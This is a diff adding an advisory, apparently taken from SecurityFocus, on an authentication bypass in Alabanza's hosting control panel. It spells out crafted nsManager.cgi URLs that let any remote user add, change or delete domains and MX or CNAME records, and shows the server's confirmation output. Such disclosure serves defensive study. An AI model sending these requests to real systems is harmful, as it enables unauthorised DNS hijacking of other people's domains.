@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/1710/info
+
+Alabanza is a web hosting provider that offers automated solutions for virtual domain hosting. A vulnerability exists in the software implemented for automated domain administration.
+
+Modification, deletion, and addition of domains and MX and CNAME records associated with Alabanza hosts and resellers does not require valid authentication and can be conducted by any remote user.
+
+Access to the Control Panel which handles administrative controls for domains associated with Alabanza does not require a username and password if specially crafted URLs are requested (see the exploit tab for further details).
+
+To add a domain to the name server (using example.com as an example and 'target' being an Alabanza host/reseller domain):
+
+http://target/cp/rac/nsManager.cgi?Domain=<example.com>&IP=<IP address>&OP=add&Language=english&Submit=Confirm
+
+Accessing the following URL:
+
+http://www.example.com/cp/rac/nsManager.cgi?Domain=HAHAHA.org&IP=127.0.0.1&OP=add&Language=english&Submit=Confirm
+
+will display a page stating:
+
+"Name Server Manager
+Domain example.com will be added within 1 hour!
+Your domain example.com <IP address> will be setup within 1 hour!
+
+Please click here to go back."
+
+From here modification, deletion, and addition of domains can be made, as well as changing the default MX or CNAME records.
+
